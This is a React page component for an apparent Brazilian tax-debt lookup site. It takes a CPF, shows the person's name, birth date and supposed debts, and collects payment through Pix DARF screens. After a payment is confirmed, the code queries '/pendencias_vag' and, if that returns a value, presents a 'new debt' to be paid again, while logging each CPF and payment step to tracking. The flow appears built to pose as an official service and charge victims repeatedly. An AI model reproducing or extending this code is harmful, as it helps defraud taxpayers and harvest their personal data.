import { useState, useCallback, useEffect, useRef } from "react";
import { useParams, useLocation } from "react-router-dom";
import CpfInput from "@/components/CpfInput";
import LoadingScreen from "@/components/LoadingScreen";
import ResultScreen from "@/components/ResultScreen";
import DarfScreen from "@/components/DarfScreen";
import PixLoadingScreen from "@/components/PixLoadingScreen";
import PixPaymentScreen from "@/components/PixPaymentScreen";
import PaidScreen from "@/components/PaidScreen";
import PendenciaErrorScreen from "@/components/PendenciaErrorScreen";
import ConsultasTab from "@/components/ConsultasTab";
import SegurancaTab from "@/components/SegurancaTab";
import AjudaTab from "@/components/AjudaTab";
import TabTransition from "@/components/TabTransition";
import SplashScreen from "@/components/SplashScreen";
import { useTracking } from "@/hooks/useTracking";
import { supabase } from "@/integrations/supabase/client";

type Screen = "splash" | "input" | "loading" | "result" | "darf" | "pix-loading" | "pix-payment" | "paid" | "pendencia-error" | "checking-pendencias";
type Tab = "inicio" | "consultas" | "seguranca" | "ajuda";
const recaptchaTokenStore = { current: "" };

export interface Pendencia {
  codigoReceita: string;
  dataVencimento: string;
  juros: number;
  multa: number;
  numeroReferencia: string;
  valorPrincipal: number;
  valorTotal: number;
}

interface ResultData {
  nome: string;
  nascimento: string;
  sexo: string;
  pendencias: Pendencia[];
}

const Index = () => {
  const { cpf: cpfParam } = useParams<{ cpf?: string }>();
  const location = useLocation();
  const initialTab = (location.state as { tab?: Tab })?.tab || "inicio";
  const [showSplash, setShowSplash] = useState(() => !cpfParam && !sessionStorage.getItem("splash_shown"));
  const [screen, setScreen] = useState<Screen>(cpfParam ? "loading" : "input");
  const [activeTab, setActiveTab] = useState<Tab>(initialTab);
  const [cpf, setCpf] = useState(cpfParam ? cpfParam.replace(/\D/g, "") : "");
  const [result, setResult] = useState<ResultData | null>(null);
  const [pixCopiaCola, setPixCopiaCola] = useState("");
  const [transactionId, setTransactionId] = useState("");
  const [novaPendenciaValor, setNovaPendenciaValor] = useState(0);
  const { trackEvent } = useTracking();
  const totalValor = result?.pendencias.reduce((s, p) => s + p.valorTotal, 0) ?? 0;
  const autoStarted = useRef(false);

  // Auto-start consultation when CPF comes from URL
  useEffect(() => {
    if (cpfParam && !autoStarted.current) {
      autoStarted.current = true;
      const cleanCpf = cpfParam.replace(/\D/g, "");
      if (cleanCpf.length === 11) {
        setCpf(cleanCpf);
        setScreen("loading");
        trackEvent("cpf_submitted", cleanCpf, { source: "url" });
      } else {
        setScreen("input");
      }
    }
  }, [cpfParam, trackEvent]);

  // Sync tab from navigation state
  useEffect(() => {
    const navTab = (location.state as { tab?: Tab })?.tab;
    if (navTab) {
      setActiveTab(navTab);
      if (navTab === "inicio") setScreen("input");
    }
  }, [location.state]);

  const handleTabChange = (tab: Tab) => {
    setActiveTab(tab);
    setScreen("input");
  };

  useEffect(() => {
    trackEvent("page_view");
  }, [trackEvent]);

  const handleCpfSubmit = (value: string, recaptchaToken: string) => {
    setCpf(value);
    recaptchaTokenStore.current = recaptchaToken;
    setScreen("loading");
    trackEvent("cpf_submitted", value);
  };

  const handleLoadingComplete = useCallback((data: ResultData) => {
    setResult(data);
    setScreen("result");
    trackEvent("result_viewed", cpf, { nome: data.nome, pendencias: data.pendencias.length });
  }, []);

  const handleBack = () => {
    setScreen("input");
    setCpf("");
    setResult(null);
  };

  const handleRegularizar = () => {
    setScreen("darf");
    trackEvent("darf_viewed", cpf, { valor: totalValor });
  };

  const handleBackToResult = () => {
    setScreen("result");
  };

  const handleGerarDarf = () => {
    setScreen("pix-loading");
    trackEvent("pix_generating", cpf);
  };

  const handlePixComplete = useCallback((pix: string, txnId: string) => {
    setPixCopiaCola(pix);
    setTransactionId(txnId);
    setScreen("pix-payment");
    trackEvent("pix_generated", cpf, { pix_length: pix.length, valor: totalValor, transactionId: txnId });
  }, [totalValor, cpf, trackEvent]);

  // After payment confirmed, check for new pendencies via /pendencias_vag
  const handlePaid = useCallback(async () => {
    trackEvent("payment_confirmed", cpf, { valor: totalValor, transactionId });
    setScreen("checking-pendencias");

    try {
      const res = await supabase.functions.invoke("api-proxy", {
        body: { endpoint: "/pendencias_vag", cpf },
      });

      const data = res.data;
      const pendencia = data?.pendencias?.[0];
      if (pendencia && Number(pendencia.valorTotal) > 0) {
        setNovaPendenciaValor(Number(pendencia.valorTotal));
        trackEvent("nova_pendencia_encontrada", cpf, { valor: pendencia.valorTotal });
        setScreen("pendencia-error");
        return;
      }
    } catch {
      // If API fails, just show paid screen
    }

    setScreen("paid");
  }, [cpf, totalValor, transactionId, trackEvent]);

  // When user clicks "Regularizar" on error screen, create a new single-pendencia result and go to darf
  const handleRegularizarNovaPendencia = useCallback(() => {
    setResult((prev) => {
      if (!prev) return prev;
      return {
        ...prev,
        pendencias: [
          {
            codigoReceita: "DARF",
            dataVencimento: new Date().toISOString().split("T")[0],
            juros: 0,
            multa: 0,
            numeroReferencia: `VAG-${Date.now()}`,
            valorPrincipal: novaPendenciaValor,
            valorTotal: novaPendenciaValor,
          },
        ],
      };
    });
    setScreen("darf");
    trackEvent("darf_viewed", cpf, { valor: novaPendenciaValor, source: "pendencia_vag" });
  }, [novaPendenciaValor, cpf, trackEvent]);

  const handlePixError = useCallback(() => {
    setScreen("darf");
  }, []);

  if (showSplash) {
    return (
      <SplashScreen
        onComplete={() => {
          sessionStorage.setItem("splash_shown", "1");
          setShowSplash(false);
        }}
      />
    );
  }


  if (screen === "loading") {
    return <LoadingScreen cpf={cpf} recaptchaToken={recaptchaTokenStore.current} onComplete={handleLoadingComplete} onTabChange={handleTabChange} fast={!!cpfParam} />;
  }

  if (screen === "checking-pendencias" && result) {
    return <LoadingScreen cpf={cpf} recaptchaToken="" onComplete={() => {}} onTabChange={handleTabChange} />;
  }

  if (screen === "pendencia-error" && result) {
    return (
      <PendenciaErrorScreen
        nome={result.nome}
        cpf={cpf}
        valorNovaPendencia={novaPendenciaValor}
        onRegularizar={handleRegularizarNovaPendencia}
        onTabChange={handleTabChange}
      />
    );
  }

  if (screen === "pix-loading" && result) {
    return (
      <PixLoadingScreen
        cpf={cpf}
        nome={result.nome}
        valor={totalValor}
        onComplete={handlePixComplete}
        onError={handlePixError}
        onTabChange={handleTabChange}
      />
    );
  }

  if (screen === "paid" && result) {
    return (
      <PaidScreen
        nome={result.nome}
        cpf={cpf}
        valor={totalValor}
        transactionId={transactionId}
        onBack={handleBack}
        onTabChange={handleTabChange}
      />
    );
  }

  if (screen === "pix-payment" && result) {
    return (
      <PixPaymentScreen
        nome={result.nome}
        cpf={cpf}
        valor={totalValor}
        pixCopiaCola={pixCopiaCola}
        transactionId={transactionId}
        onBack={handleBackToResult}
        onPaid={handlePaid}
        onTabChange={handleTabChange}
      />
    );
  }

  if (screen === "darf" && result) {
    return (
      <DarfScreen
        nome={result.nome}
        cpf={cpf}
        pendencias={result.pendencias}
        onBack={handleBackToResult}
        onGerarDarf={handleGerarDarf}
        onTabChange={handleTabChange}
      />
    );
  }

  if (screen === "result" && result) {
    return (
      <ResultScreen
        nome={result.nome}
        nascimento={result.nascimento}
        sexo={result.sexo}
        cpf={cpf}
        pendencias={result.pendencias}
        onBack={handleBack}
        onRegularizar={handleRegularizar}
        onTabChange={handleTabChange}
      />
    );
  }

  const tabContent = (() => {
    if (activeTab === "consultas") return <ConsultasTab onTabChange={handleTabChange} />;
    if (activeTab === "seguranca") return <SegurancaTab onTabChange={handleTabChange} />;
    if (activeTab === "ajuda") return <AjudaTab onTabChange={handleTabChange} />;
    return <CpfInput onSubmit={handleCpfSubmit} onTabChange={handleTabChange} />;
  })();

  return (
    <TabTransition tabKey={activeTab}>
      {tabContent}
    </TabTransition>
  );
};

export default Index;
